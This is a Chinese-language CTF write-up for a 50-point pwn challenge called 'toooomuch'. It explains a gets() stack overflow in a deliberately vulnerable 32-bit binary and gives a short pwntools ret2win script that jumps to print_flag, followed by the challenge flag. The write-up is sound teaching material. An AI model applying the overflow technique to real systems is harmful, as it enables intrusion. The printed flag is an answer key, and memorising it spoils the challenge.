# PHM #62 Pwn — toooomuch

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 50 |
| 連線 | `nc ctf.hackme.quest 7702` |
| 檔案 | [`/static/toooomuch`](https://ctf.hackme.quest/static/toooomuch) (ELF 32-bit, not stripped, **stack executable**) |
| 提示 | Can you pass the game? |
| 保護 | No canary, No PIE, GNU_STACK = RWE |

## 分析

`toooomuch()`: 先 `gets(buf)` (buf 在 `ebp-0x18`) → 無限溢位; 接著 `check_passcode()` (要 passcode `43210`), 過了才 `play_a_game()` (猜 `rand()%100`, 8 次內猜中 → `print_flag()`)。

`print_flag()` 就是 `system("/bin/cat fake_flag")` — 伺服器上 `fake_flag` 的內容就是這題 (50 分) 的 flag。

到 return address 的距離 = `0x18 + 4 = 28`。既然溢位能蓋 return address, **直接跳 `print_flag` (0x804863b)** 就好, 不用真的去玩猜數字遊戲 (passcode 檢查失敗也沒差, 失敗只是跳過遊戲, `toooomuch` 照樣 return 到我們蓋的位址)。

## 解法

```python
from pwn import *
context(arch='i386', os='linux')
r=remote('ctf.hackme.quest',7702)
r.sendline(b'A'*28 + p32(0x804863b))   # ret -> print_flag -> cat fake_flag
print(r.recvall(timeout=6))
```

## Flag

```
FLAG{B1N@RY S3@RCH 15 F@5T T0 TH3 GU355 NUM133R G@M3...Vx1uck7CvuaCEew7}
```

## 感想

遊戲本身可以用二分搜 8 次內猜中 (flag 也這麼說), 但既然有 stack overflow, 直接把 return address 蓋成 `print_flag` 最省事。同一支 binary 的進階版見 [toooomuch-2](toooomuch-2.md) (#63, 拿真正的 shell)。
